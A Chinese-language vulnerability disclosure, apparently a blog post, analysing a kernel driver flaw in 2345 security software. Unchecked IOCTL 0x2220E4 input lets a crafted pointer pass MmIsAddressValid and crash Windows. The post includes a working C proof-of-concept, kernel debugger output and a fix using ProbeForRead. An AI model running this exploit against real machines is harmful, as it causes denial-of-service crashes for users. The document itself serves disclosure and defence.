# 漏洞概述

  * 软件网址：<http://safe.2345.cc/>

  * 版本：v3.7 X64

2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x002220E4)接口处理中，对输入数据校验不严格，可构造数据中包含非法地址导致访问违例，然后bsod拒绝服务。

# 漏洞分析

在`IRP_MJ_DEVICE_CONTROL`处理函数中，对`0x2220E4`接口进行处理时如下所示：

![img](http://wx1.sinaimg.cn/mw690/006mu4nKly1ft28yb8ym6j30mu03p747.jpg)

`InputBuf`是应用层传入的输入缓存内容，校验`InputBuf`是否为空，长度是否超过8字节，然后通过`MmIsAddressValid`验证地址是否合法，合法后通过偏移16访问该内存内容是否等于标记`li7p`。

问题就出在这里，`MmIsAddressValid`并不能验证一个内存某范围内是否可读可写，仅仅只能验证该地址读写是否会触发一个页错误。

所以我们就可以构造一个可通过`MmIsAddressValid`验证并且地址16偏移不可读的内存作为输入，造成bsod。

看下面的poc代码，通过`VirtualAlloc`分配一个页大小的内存，可读可写，然后计算页地址尾地址-4作为输入缓存的ptr，这样`MmIsAddressValid`可通过校验，再内核读取ptr+16偏移时地址已经超过该页内存范围，不可访问，导致bsod。

    
    
    int poc()
    
    {
    
    DWORD BytesReturned = 0;
    
    HANDLE h = OpenDevice("\\\\.\\2345BdPcSafe");
    
    if (h == INVALID_HANDLE_VALUE) {
    
    return 1;
    
    }
    
        //过白名单检查
    
    if (!BypassChk(h)) {
    
    return 1;
    
    }
    
    //BSOD
    
    DWORD ctlcode = 0x2220E4;
    
    #pragma pack(push,1)
    
    struct _ioctl_buf_in
    
    {
    
    __int64 ptr;
    
    };
    
    #pragma pack(pop)
    
    _ioctl_buf_in buff = { 0 };
    
        
    
        //分配一个页，可读可写，将该页地址尾地址-4作为输入缓存的ptr
    
        //然后读取+16偏移时地址已经越过该页内存范围，不可访问，bsod
    
    PVOID ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
    
    memset(ptr, 0x41, 0x1000);//
    
    buff.ptr = (__int64)ptr + 0x1000 - 0x4;
    
    if(!DeviceIoControl(h, ctlcode, &buff, sizeof(_ioctl_buf_in), &buff, sizeof(_ioctl_buf_in), &BytesReturned, NULL)) {
    
    printf("[-] DeviceIoControl %x error: %d\n", ctlcode, GetLastError());
    
    }
    
    return 0;
    
    }
    

看看内存更加清晰，`buff`地址是`003efea0`，`buff.ptr`的值是`00030ffc`，可以清楚看到`00030ffc`+16偏移处肯定是不可读的了。

    
    
    0: kd:x86> dd 003efe3c 
    
    00000000`003efe3c  003efe68 75db3237 00000030 002220e4
    
    00000000`003efe4c  003efea0 00000008 003efea0 00000008
    
    0: kd:x86> dd 003efea0 
    
    00000000`003efea0  00030ffc 00000000 01234808 003efef8
    
    0: kd:x86> dd 00030ffc 
    
    00000000`00030ffc  41414141 ???????? ???????? ????????
    
    00000000`0003100c  ???????? ???????? ???????? ????????
    

# 结语

这个漏洞算是前一个的延申，依然是应用层传入内容中包括内存地址，也加入了内存合法性验证代码，但是却没什么用，并没有验证到要访问的内存处的合法性，这个疏漏导致了漏洞的产生。

更好的验证内存合法性的函数应该使用`ProbeForRead(p, len, x)`，可以验证一个范围内内存的合法性，更加严谨，能更好的避免漏洞的产生。

稍微总结一下，应用层传入内容结构越复杂，越容易出现问题。这个漏洞出现的位置，本来应该是2345接口协议验证的代码，是为了增加安全性的，却不想成为了安全性问题的原因。

该系列后续会继续分析其他原因引起的漏洞，如有兴趣，敬请期待！

博客原文：<https://anhkgg.github.io/vul-2345-2/>

 **参考**

  1. [如何验证一个地址可否使用—— MmIsAddressValid函数分析](https://www.cnblogs.com/Ox9A82/p/5571217.html)

  2. <https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-mmisaddressvalid>

  

 _欢迎关注 公众号：汉客儿_  

